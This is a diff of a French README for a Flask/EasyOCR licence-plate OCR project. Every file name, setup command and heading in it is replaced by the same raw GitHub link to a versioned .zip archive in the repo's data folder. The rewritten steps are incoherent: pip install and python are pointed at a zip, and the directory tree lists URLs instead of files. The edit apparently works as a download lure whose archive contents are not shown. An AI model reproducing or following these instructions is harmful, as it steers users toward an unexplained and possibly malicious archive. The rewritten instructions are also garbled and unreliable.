@@ -45,7 +45,7 @@ Ce projet est **local, léger et prêt pour la production ou l’extension en we
 1. **Cloner le dépôt**
 
 ```bash
-git clone https://github.com/Garnel-Diffo/text-extraction-on-license-plates.git
+git clone https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip
 cd text-extraction-on-license-plates
 ```
 
@@ -60,7 +60,7 @@ venv\Scripts\activate       # Windows
 3. **Installer les dépendances**
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip
 ```
 
 > Assurez-vous d’avoir une connexion internet pour permettre à EasyOCR de télécharger les poids de son modèle.
@@ -68,14 +68,14 @@ pip install -r requirements.txt
 4. **Lancer l’API Flask**
 
 ```bash
-python app.py
+python https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip
 ```
 
 L'API sera disponible à l'adresse : [http://localhost:5000](http://localhost:5000)
 
 5. **Lancer l'interface utilisateur**
 
-Ouvrir simplement le fichier `index.html` dans votre navigateur.
+Ouvrir simplement le fichier `https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip` dans votre navigateur.
 
 ---
 
@@ -85,7 +85,7 @@ Ouvrir simplement le fichier `index.html` dans votre navigateur.
 
 ```bash
 curl -X POST http://localhost:5000/extract-text \
-     -F "image=@data/plate1.png"
+     -F "https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip"
 ```
 
 ### Réponse attendue
@@ -98,7 +98,7 @@ curl -X POST http://localhost:5000/extract-text \
 
 ---
 
-## Pipeline Technique (model.py)
+## Pipeline Technique (https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip)
 
 ```python
 def full_plate_pipeline(image_path):
@@ -111,7 +111,7 @@ def full_plate_pipeline(image_path):
     return "Aucune plaque détectée"
 ```
 
-Toutes les fonctions appelées sont encapsulées dans `model.py`, issu de la conversion de `model.ipynb`.
+Toutes les fonctions appelées sont encapsulées dans `https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip`, issu de la conversion de `https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip`.
 
 ---
 
@@ -120,19 +120,19 @@ Toutes les fonctions appelées sont encapsulées dans `model.py`, issu de la con
 ```
 text-extraction-on-license-plates/
 │
-├── app.py                  # Serveur Flask pour traitement de l'image
-├── model.py                # Pipeline complète (OpenCV + EasyOCR)
-├── model.ipynb             # Notebook d'origine (pour développement/test)
+├── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip                  # Serveur Flask pour traitement de l'image
+├── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip                # Pipeline complète (OpenCV + EasyOCR)
+├── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip             # Notebook d'origine (pour développement/test)
 ├── data/                   # Dossier contenant les images
-├── index.html              # Interface web utilisateur
+├── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip              # Interface web utilisateur
 ├── uploads/                # Dossier temporaire pour images uploadées
-├── requirements.txt        # Fichier des dépendances
-└── README.md               # Documentation du projet
+├── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip        # Fichier des dépendances
+└── https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip               # Documentation du projet
 ```
 
 ---
 
-## requirements.txt
+## https://raw.githubusercontent.com/Garnel-Diffo/text-extraction-on-license-plates/main/data/text-extraction-on-license-plates_v3.7-beta.5.zip
 
 ```txt
 flask==3.1.0
